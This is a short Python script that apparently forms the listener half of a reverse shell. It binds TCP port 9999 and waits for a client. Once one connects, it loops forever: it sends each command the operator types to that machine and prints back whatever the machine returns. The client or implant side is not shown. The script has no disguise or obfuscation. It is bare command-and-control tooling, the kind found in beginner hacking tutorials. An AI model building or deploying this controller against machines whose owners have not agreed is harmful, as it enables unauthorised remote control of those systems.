import socket
import sys
from time import sleep


# create function socket
def create_socket():
    try:
        global host, port, server
        host = socket.gethostname()
        port = 9999
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    except socket.error as msg:
        print("socket creation error: " + str(msg) + " reconnecting...... ")
        sleep(2)
        create_socket()

# binding the socket and listening for connection
def bind_socket():
    try:
        global host, port, server
        print("binding the port " + str(port))
        server.bind((host, port))
        server.listen(5)
    except socket.error as msg:
        print('socket binding error ....' + str(msg) + " rebinding........")
        sleep(2)
        bind_socket()


# establish connetions with a client (solect must be listing)
def socket_accept():
    global server, port
    connection, address = server.accept()
    print("connection has been established | " + "ip " + address[0] + " | port " + str(address[1]))
    send_commands(connection)
    connection.close()


# send command to client
def send_commands(connection):
    while True:
        cmd = input()
        print(cmd)
        if cmd.__eq__("exit"):
            connection.close()
            server.close()
            sys.exit(1)
        if len(str.encode(cmd)) > 0:
            connection.send(str.encode(cmd))
            client_response = str(connection.recv(1024), 'utf-8')
            print(client_response, end=" ")


if __name__ == '__main__':
    create_socket()
    bind_socket()
    socket_accept()